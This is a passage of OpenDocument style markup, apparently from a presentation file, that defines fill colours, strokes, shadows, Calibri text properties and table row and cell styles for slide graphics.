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000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a141" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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74">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="non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464">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465">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a466" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a467">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e67e22"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51">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a152" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a15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789">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#8e44ad" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a4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79">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1">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62">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a163" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a164">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parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a79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481">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a482" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a483">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e67e22"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2">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73">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a174" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a17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95">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496">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497">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a498" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a499">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e67e22"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8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84">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#8e44ad" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a185" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a18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e0f5f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.01111in" svg:stroke-color="#028090" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a195">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9">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1400">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1401">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able-row" style:name="a1402">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a1403">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04">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1405">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1406">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07">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08">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1409">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1410">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11">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12">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1413">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1414">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15">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16">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1417">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1418">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able-row" style:name="a1419">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1100">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a110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09">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1420">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21">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1422">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1423">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24">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25">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1426">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1427">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28">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29">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a111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draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a9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3">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#fdecea" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#f1948a" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a904">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08">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e8f8f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#82e0aa" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a909">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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1431">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432">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433">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1434">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1435">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resentation" style:name="a1436">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a9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914" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a915">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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2">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draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%"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parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a14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33">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1134">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24">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#fdecea" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#f1948a" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a925">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29">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e8f8f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#82e0aa" svg:stroke-opacity="100%"/>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draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="non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459">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a618">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="none" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>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draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="non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935" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a936">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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464">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="non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draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="non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51">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a3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1">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%"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draw:fill="none" draw:stroke="dash" draw:stroke-dash="a316" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a11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5">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#fdecea" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#f1948a" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a946">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solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>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draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="non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161">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a3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0">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e8f8f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#82e0aa" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a326">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55">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956" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a957">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%"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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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4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43">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1485">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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solid" draw:fill-color="#028090" draw:opacity="100%"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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a3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6">
      <style:graphic-properties draw:fill="none" draw:stroke="dash" draw:stroke-dash="a335" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>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solid" draw:fill-color="#fdecea" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#f1948a" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a967">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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a149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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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4">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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71">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e8f8f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#82e0aa" svg:stroke-opacity="100%"/>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solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="non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none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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82">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8">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3">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%"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4" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a99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0">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681">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#1b3a4b" draw:opacity="100%" draw:stroke="non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2">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73">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a374" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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384">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385">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a386" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a387">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#c0392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99">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table-row" style:name="a1300">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a1301">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02">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1303">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1304">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05">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06">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1307">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1308">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09">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10">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1311">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1312">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13">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14">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1315">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1316">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able-row" style:name="a1317">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a1318">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19">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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07">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008" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1009">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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1321">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22">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23">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1324">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1325">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26">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27">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1328">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1329">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0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804">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#1b3a4b" draw:opacity="100%" draw:stroke="non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09" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1330">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31">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1332">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1333">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able-row" style:name="a1334">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a1335">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36">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1337">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1338">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39">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10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21">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022" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a102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18">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819">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1340">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1341">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>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2">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5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4">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a50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margin-left="0in" fo:text-indent="0in"/>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6">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5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8">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a50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margin-left="0in" fo:text-indent="0in"/>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35">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036" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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24" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a82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0">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able-row" style:name="a1351">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a5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2">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presentation" style:name="a511">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a1353">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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54">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>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5">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7">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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8">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="drawing-page" style:name="a517">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359">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518">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a519" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a10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solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a10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draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1049">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8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3">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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9">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0">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61">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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margin-left="0in" fo:text-indent="0in"/>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3">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5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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a524">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margin-left="0in" fo:text-indent="0in"/>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7">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8">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a5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9">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528">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529">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1050" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a105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draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a216">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic"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41" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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70">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1371">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>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72">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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="graphic" style:name="a5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5">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a534">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#888888"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6">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535">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#a8d8de"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536">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffd70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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a537">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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a538">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6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222">
      <style:graphic-properties draw:fill="none" draw:stroke="dash" draw:stroke-dash="a221" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1064" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a223">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2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51" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a22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27ae6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2">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="non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0">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381">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540">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ffd70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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a541">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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a542">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4">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543">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#a8d8de"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85">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a544">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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a5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389">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548">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549">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%"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35">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="presentation" style:name="a1077">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a8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1">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#fdecea" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#f1948a" svg:stroke-opacity="100%"/>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66">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e8f8f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#82e0aa" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a867">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1391">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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2">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>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3">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5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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a554">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#888888"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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a555">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7">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556">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557">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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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1">
      <style:graphic-properties draw:fill="none" draw:stroke="dash" draw:stroke-dash="a240" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="drawing-page" style:name="a1083">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2">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4">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="non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parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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72" style:parent-style-name="Graphics">
